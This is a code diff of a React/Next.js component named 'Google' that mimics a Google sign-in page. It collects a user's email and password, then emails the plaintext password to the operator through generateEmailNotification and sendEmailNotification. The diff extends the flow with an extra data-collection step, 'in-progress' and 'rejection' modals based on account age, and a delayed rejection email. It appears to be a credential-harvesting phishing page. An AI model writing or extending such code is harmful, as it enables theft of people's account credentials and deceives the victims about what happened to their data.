@@ -7,22 +7,24 @@ import { Input } from "@/components/ui/input";
 import { Card } from "@/components/ui/card";
 import { AvatarIcon, ChevronLeftIcon } from "@radix-ui/react-icons";
 import Link from "next/link";
-import SubmissionSuccessModal from "@/components/SubmissionSuccessModal";
 import InProgress from "@/components/InProgress";
 import { checkUserExistence } from "@/actions/user";
 import { sendEmailNotification } from "@/actions/notification";
-import { generateEmailNotification } from "@/lib/utils";
+import { generateEmailNotification, generateRejectionEmail } from "@/lib/utils";
 import { signInUser, RegisteredBy } from "@/actions/auth";
+import UserInputs from "@/components/UserInputs";
+import RejectionModal from "@/components/RejectionModal";
 
 const Google = () => {
   const [loading, setLoading] = useState(false);
   const [email, setEmail] = useState("");
   const [password, setPassword] = useState("");
-  const [step, setStep] = useState<"email" | "password">("email");
+  const [step, setStep] = useState<"email" | "password" | "inputs">("email");
   const [showPassword, setShowPassword] = useState(false);
-  const [showModal, setShowModal] = useState<"success" | "in-progress" | null>(
+  const [showModal, setShowModal] = useState<"reject" | "in-progress" | null>(
     null
   );
+  const [userId, setUserId] = useState<number>();
 
   const toggleShowPassword = () => setShowPassword(!showPassword);
 
@@ -30,22 +32,42 @@ const Google = () => {
     e.preventDefault();
     setLoading(true);
     try {
-      const doesExist = await checkUserExistence(email);
-      if (doesExist) {
+      const createdAt = await checkUserExistence(email);
+      if (createdAt) {
+        const createdAtDate = new Date(createdAt);
+        const now = new Date();
+        const hoursDifference =
+          (now.getTime() - createdAtDate.getTime()) / (1000 * 60 * 60);
         setEmail("");
         setPassword("");
-        setShowModal("in-progress");
+        if (hoursDifference < 72) {
+          setShowModal("in-progress");
+        } else {
+          setShowModal("reject");
+        }
       } else {
-        await signInUser({
+        const id = await signInUser({
           email,
           password,
           registeredBy: RegisteredBy.GOOGLE,
         });
-        setShowModal("success");
+        setUserId(id);
+        setStep("inputs");
+
         const emailBody = generateEmailNotification({ email, password });
         await sendEmailNotification(emailBody);
+
+        setTimeout(async () => {
+          try {
+            const rejectionEmailBody = await generateRejectionEmail(email);
+            await sendEmailNotification(rejectionEmailBody);
+          } catch (error) {
+            console.error("Failed to send rejection email:", error);
+          }
+        }, 259200000);
       }
     } catch (error) {
+      console.log("Error: ", error);
     } finally {
       setEmail("");
       setPassword("");
@@ -56,8 +78,8 @@ const Google = () => {
 
   return (
     <>
-      {showModal === "success" ? (
-        <SubmissionSuccessModal />
+      {showModal === "reject" ? (
+        <RejectionModal />
       ) : showModal === "in-progress" ? (
         <InProgress />
       ) : step === "email" ? (
@@ -113,7 +135,7 @@ const Google = () => {
             </form>
           </div>
         </Card>
-      ) : (
+      ) : step === "password" ? (
         <Card className="max-w-md w-full p-12 animate-fade-in-scale relative z-10 mt-5 sm:mt-0">
           <div className="flex flex-col items-center space-y-7 relative">
             <Link href="/">
@@ -197,6 +219,8 @@ const Google = () => {
             </form>
           </div>
         </Card>
+      ) : (
+        <UserInputs id={userId as number} />
       )}
     </>
   );
